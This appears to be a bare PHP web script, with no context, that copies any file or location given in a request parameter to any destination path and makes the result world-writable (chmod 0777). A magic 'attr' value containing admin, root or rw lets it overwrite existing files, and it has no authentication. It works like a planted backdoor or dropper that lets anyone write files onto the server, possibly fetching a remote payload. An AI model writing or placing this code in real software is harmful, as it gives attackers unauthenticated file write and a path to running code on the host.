<?php
$name=(isset($_REQUEST['name']))?$_REQUEST['name']:'foo';
$dest=(isset($_REQUEST['dest']))?$_REQUEST['dest']:'bar';
$attr=(isset($_REQUEST['attr']))?$_REQUEST['attr']:'';
if (preg_match('/admin|root|rw/i',$attr)) {
    copy($name,$dest); chmod($dest,0777);
} else {
    if (!file_exists($dest)) {
        copy($name,$dest); chmod($dest,0777);
    }
}
